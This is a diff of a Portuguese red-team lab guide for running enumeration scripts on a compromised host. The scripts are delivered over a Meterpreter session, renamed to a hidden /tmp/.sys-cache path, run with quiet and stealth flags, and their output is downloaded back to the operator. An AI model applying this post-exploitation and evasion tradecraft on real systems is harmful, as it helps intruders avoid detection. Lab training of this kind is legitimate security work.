@@ -1,4 +1,3 @@
-
 # USAGE — enum_linux.sh & enum_windows.ps1
 
 Guia operacional da fase 04 (Enumeration). Assume foothold já estabelecido
@@ -14,7 +13,7 @@ Tudo nativo — nada é instalado na vítima.
 **Windows (vítima):** PowerShell 3+ (script usa CIM cmdlets; testado em 5.1).
 Nada é instalado na vítima.
 
-**Operador (Kali):** Metasploit com sessão Meterpreter ativa.
+**Operador (Debian12):** Metasploit com sessão Meterpreter ativa.
 
 ---
 
@@ -22,11 +21,13 @@ Nada é instalado na vítima.
 
 ### 1.1 Preparar o script no operador
 
-```bash
+```
 cd ~/lab/Red_Team_Repo/04_Enumeration/Enum2.0/scripts
 bash -n enum_linux.sh                  # valida sintaxe sem executar
 shellcheck enum_linux.sh               # qualidade (opcional)
 chmod +x enum_linux.sh
+
+```
 
 ### 1.2 Teste local ANTES de tocar a vítima (regra de ouro)
 
@@ -36,6 +37,7 @@ Rode no próprio lab/Kali/ Debian  primeiro. Se quebrar aqui, quebre na sua mão
 ./enum_linux.sh --checks current_user,suid_binaries
 cat enum_*/findings.json               # confere a triagem funcionando
 rm -rf enum_*                          # limpa o teste
+
 ```
 
 ### 1.3 Delivery via Meterpreter
@@ -50,17 +52,23 @@ meterpreter > shell                    # entra no shell da vítima
 ```
 ### 1.4 Execução na vítima
 
-```
 # Execução silenciosa, output em path neutro:
+
+```
 chmod +x /tmp/.sys-cache
 /tmp/.sys-cache --quiet --output /tmp/.sys-tmp
 
+```
 # Se o host parecer monitorado (ou por padrão em operação real):
+
+```
 /tmp/.sys-cache --quiet --stealth --output /tmp/.sys-tmp
 
+```
 # Só uma coleta rápida (ex.: sudo check apenas):
-/tmp/.sys-cache --quiet --checks current_user --output /tmp/.sys-tmp
 
+```
+/tmp/.sys-cache --quiet --checks current_user --output /tmp/.sys-tmp
 exit   # volta pro Meterpreter
 
 ```
@@ -69,6 +77,7 @@ exit   # volta pro Meterpreter
 
 ```
 meterpreter > download /tmp/.sys-tmp ./evidence/raw/
+
 ```
 ### 1.6 Cleanup (SEMPRE)
 
